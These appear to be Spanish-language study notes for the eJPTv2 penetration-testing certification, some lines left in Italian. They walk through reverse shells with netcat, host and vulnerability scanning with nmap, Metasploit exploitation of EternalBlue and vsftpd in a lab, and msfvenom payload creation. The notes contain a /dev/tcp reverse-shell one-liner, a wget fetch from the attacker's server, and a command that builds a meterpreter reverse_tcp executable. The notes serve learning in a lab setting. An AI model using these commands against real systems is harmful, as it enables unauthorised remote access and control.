# CONCEPTOS BÁSICOS DE HACKING
# Uso de netcat
Si quiero obtener una reverse shell en mi máquina atacante, primero debo conocer la dirección IP, que puedo obtener con el siguiente comando:  

`hostname -I` 

Ahora, puedo ir a la página revshells.com y generar el payload.  

![1](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/1.jpg)


En la página, ingreso la dirección IP de la máquina atacante y genero el payload.  
Me pongo en escucha en el puerto, por ejemplo, 9001, con el siguiente comando:  

`sudo nc -lvnp 9001`  

Luego, en la máquina víctima, ejecuto el payload generado en revshells.com:  

`sh -i >& /dev/tcp/10.10.10.10/9001 0>&1`

# Servicio de Python para compartir archivos   
Puede ser útil durante un ataque tener que cargar archivos en la máquina víctima.  
Para hacerlo, puedo "montar" un servidor web en Kali para compartir archivos.  
Escribo el comando:  

`sudo python3 -m http.server 80`  

En la máquina víctima podré descargar el archivo con el comando:  

`wget http://IpMacchinaKali/NombreFichero`  

# ARP-SCAN - NETDISCOVER  
Para descubrir máquinas dentro de mi red, puedo utilizar arpscan.  
Debo saber el nombre de la interfaz de red y luego escribir el comando:  

`sudo arp-scan -I eth0 --localnet`  

Puedo hacer lo mismo con netdiscover, escribiendo el comando:  

`sudo netdiscover -I eth0 -r 192.168.10.0/24`  

Puedo obtener la misma información con nmap con el comando:  

`sudo nmap -sn 192.168.10.0/24`  

# Escaneos básicos con nmap  
Ejemplo de comando de escaneo básico con nmap:  

`sudo nmap -p- -sS -sC -sV --open --min-rate 5000 -n -vvv -Pn 192.168.0.10 -oN 1stScan`  

-p- para escanear todos los puertos  
-sS para que sea más rápido  
-sC para ejecutar una serie de scripts básicos  
-sV para que me muestre la versión del servicio encontrado en el puerto abierto  
--open para encontrar los puertos abiertos  
--min-rate con el parámetro 5000 va muy rápido, ideal para la red local de casa, pero en el caso de un examen o en la vida real es mejor usar 1500 o 2000  
-n para evitar la resolución DNS  
-vvv para mostrar los resultados durante el escaneo  
-Pn es decir, sin ping  
-oN nombrearchivo para exportar en formato nmap  

# Escaneos de vulnerabilidades con nmap  
Supponiamo di aver scansionato una macchina Windows 7 con la porta 445 aperta.  
Potremmo usare una utility di nmap per vedere se è vulnerabile.  
C'è da dire che questo script fa "molto rumore" e non è consigliabile usarlo nel mondo reale.  

`sudo nmap --script "vuln" -p445 192.168.10.10`  

# Escaneo de puertos UDP  
Es conveniente también realizar escaneos del protocolo UDP.  
Para hacerlo, por ejemplo, podemos usar el comando:  

`sudo nmap -sU --top-ports 200 --min-rate=5000 -Pn 192.168.10.10`  

# EXPLOTACIÓN DE VULNERABILIDADES Y ATAQUES DE FUERZA BRUTA  
# Uso básico de Metasploit – Explotación de EternalBlue en Windows  
Siempre conviene abrir Metasploit desde el menú de Kali, ya que así se ejecuta el siguiente comando que permite actualizar automáticamente la base de datos de Metasploit.  

`sudo msfdb init && msfconsole`  

Si quiero buscar un exploit, puedo hacerlo escribiendo, por ejemplo:  

`search eternalblue`  

O también puedo buscarlo con el nombre de la CVE correspondiente, por ejemplo:  

`search CVE-2017-0143`  

Para usar un módulo, simplemente debo escribir el comando use seguido del número correspondiente del exploit que quiero utilizar, por ejemplo, 0.  

![2](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/2.jpg)   

Con el comando show options puedo ver todas las opciones disponibles para el exploit en cuestión, y con set puedo configurar los diferentes parámetros.  

![3](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/3.jpg) 

![4](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/4.jpg)

Y finalmente, con el comando run o exploit lanzaré el ataque, y si todo funciona correctamente, obtendré una meterpreter shell.  

![5](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/5.jpg)

# Utilizzo basico de Metasploit – Exploitation vsftpd in Linux  
Iniciamos la máquina Metasploitable 2.0.0 y después de una primera exploración, vemos que tiene muchos puertos abiertos.  
En particular, intentaremos analizar el puerto 21 y lanzaremos el comando:  

`sudo nmap --script "vuln" -p21 10.10.10.6`  

![6](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/6.jpg)  

En este punto, lanzaremos Metasploit y buscaremos un exploit que podamos utilizar en este caso concreto.  

![7](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/7.jpg)

Como podemos ver, el exploit 1 parece ser el adecuado para nuestro caso, así que lo seleccionamos, configuramos los parámetros necesarios y probamos a lanzar el ataque.  

![8](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/8.jpg)   

A veces puede ser necesario ejecutar el exploit un par de veces para que surta efecto.  

![9](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/9.jpg)   

# Msfvenom – Creazione payloads  

Con esta utilidad puedo crear archivos maliciosos que me permiten obtener una sesión meterpreter en mi máquina atacante.  
Para crear, por ejemplo, un archivo malicioso para Windows, debo escribir el siguiente comando:  

`sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=6969 -f exe -o file.exe`  

Una vez creado el archivo malicioso y enviado a la máquina objetivo, deberé ponerme en escucha, en este caso en el puerto 6969, para obtener una reverse shell.    
Puedo hacerlo a través de netcat con el comando `nc -lvnp 6969` o con el multi handler de Metasploit.  
Veamos cómo usar el multi handler.      
Ejecuto Metasploit y escribo el comando:  

`use /multi/handler`  

Si escribo `show options`, puedo ver las opciones disponibles:  

![10](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/10.jpg)  

Debo configurar `LHOST` con la dirección IP de la máquina atacante y `LPORT` para que coincida con el puerto que he especificado durante la creación del archivo malicioso con `msfvenom` (6969 en este ejemplo).  

¡ATENCIÓN! ¡También el payload debe coincidir con el utilizado durante la creación del archivo!  
En este ejemplo, se observa que por defecto se utiliza el payload `generic/shell_reverse_tcp`, mientras que nosotros hemos especificado en `msfvenom` `windows/x64/meterpreter/reverse_tcp`.   

Puedo cambiarlo escribiendo:  

`set PAYLOAD windows/x64/meterpreter/reverse_tcp`    

Entonces, configuro los demás parámetros.  

![11](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/11.jpg)    

Y finalmente lo ejecuto con el comando run, y permanecerá en escucha.  
Ahora, si ejecuto el archivo malicioso en la máquina víctima, obtendré una sesión meterpreter.   

![12](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/12.jpg)  








  






































































